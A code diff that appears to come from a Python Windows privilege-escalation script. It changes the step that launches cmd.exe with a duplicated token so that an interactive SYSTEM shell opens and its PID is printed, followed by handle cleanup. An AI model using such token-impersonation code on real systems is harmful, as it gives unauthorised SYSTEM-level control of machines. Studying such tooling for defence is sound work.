@@ -94,10 +94,11 @@ print "[+] Running as: " + win32api.GetUserName()
 
 ##Start the process with the token.
 try:
+    print "[+] Starting shell as SYSTEM"
     pi =  win32process.CreateProcessAsUser(
                                             PyhTokendupe,
                                             r"C:\Windows\System32\cmd.exe",
-                                            "/c @echo OFF && echo Running as: && whoami && pause && cmd",
+                                            None,
                                             None,
                                             None,
                                             True,
@@ -105,10 +106,11 @@ try:
                                             None,
                                             None,
                                             win32process.STARTUPINFO())
+    print "\t[+]PID: " + str(pi[2])
 except pywintypes.error,e :
     print "[!] Error:" + str(e[2])
 
-
+##Clean up, revert back to self and close the 
 print "[+] Cleaning up: "
 
 print "\t[+] Reverting to self"
@@ -117,6 +119,3 @@ print "\t[+] Running as: " + win32api.GetUserName()
 
 print "\t[+] Closing Handle"
 win32api.CloseHandle(PyhTokendupe)
-
-
-
